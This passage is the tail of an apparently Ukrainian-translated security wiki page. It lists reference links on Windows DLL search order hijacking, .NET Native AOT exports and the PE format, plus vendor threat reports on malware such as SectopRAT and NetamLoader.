- [26] [Elastic Security Labs — відтворення та виявлення перехоплення порядку пошуку DLL у Windows за допомогою Elastic Defend 9.5.0](https://www.elastic.co/security-labs/threat-command/dll-search-order-hijacking-elastic-defend)
- [27] [Microsoft Learn — створення нативних бібліотек за допомогою Native AOT](https://learn.microsoft.com/en-us/dotnet/core/deploying/native-aot/libraries)
- [28] [Microsoft Learn — нативні export-функції з Native AOT](https://learn.microsoft.com/en-us/dotnet/core/deploying/native-aot/interop#native-exports)
- [29] [Microsoft Learn — ModuleInitializerAttribute](https://learn.microsoft.com/en-us/dotnet/api/system.runtime.compilerservices.moduleinitializerattribute?view=net-7.0)
- [30] [Microsoft Learn — порядок пошуку DLL](https://learn.microsoft.com/en-us/windows/win32/dlls/dynamic-link-library-search-order)
- [31] [Microsoft Learn — формат PE](https://learn.microsoft.com/en-us/windows/win32/debug/pe-format)
- [32] [FortiGuard Labs — виявлення варіанта SectopRAT, вбудованого в легітимне програмне забезпечення](https://www.fortinet.com/blog/threat-research/uncovering-a-sectoprat-variant-embedded-in-legitimate-software)
- [33] [Mandiant — викрадення LIGHTSHOW (частина перша)](https://cloud.google.com/blog/topics/threat-intelligence/lightshow-north-korea-unc2970/)
- [34] [Kaspersky Securelist — операція FlashHole](https://securelist.com/lazarus-operation-flashhole/121541/)
- [35] [Kaspersky Securelist — фреймворк завантаження .NET на основі XAML NetamLoader](https://securelist.com/netamloader/121676)
{{#include ../../../banners/hacktricks-training.md}}
